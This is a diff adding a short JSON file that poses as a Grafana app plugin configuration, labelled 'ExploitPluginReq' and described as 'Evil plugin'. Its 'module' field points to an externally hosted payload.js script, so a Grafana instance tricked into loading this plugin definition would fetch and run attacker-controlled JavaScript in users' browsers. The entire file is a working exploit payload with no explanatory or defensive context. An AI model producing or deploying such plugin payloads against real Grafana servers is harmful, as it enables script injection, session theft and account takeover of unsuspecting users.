@@ -1,0 +1,16 @@
+{
+  "name": "ExploitPluginReq",
+  "type": "app",
+  "id": "grafana-lokiexplore-app",
+  "enabled": true,
+  "pinned": true,
+  "autoEnabled": true,
+  "module": "https://ya3raj.github.io/bhuwanportfolio/payload.js",
+  "baseUrl": "public/plugins/grafana-lokiexplore-app",
+  "info": {
+    "author": {
+      "name": "Lostsec"
+    },
+    "description": "Evil plugin"
+  }
+}
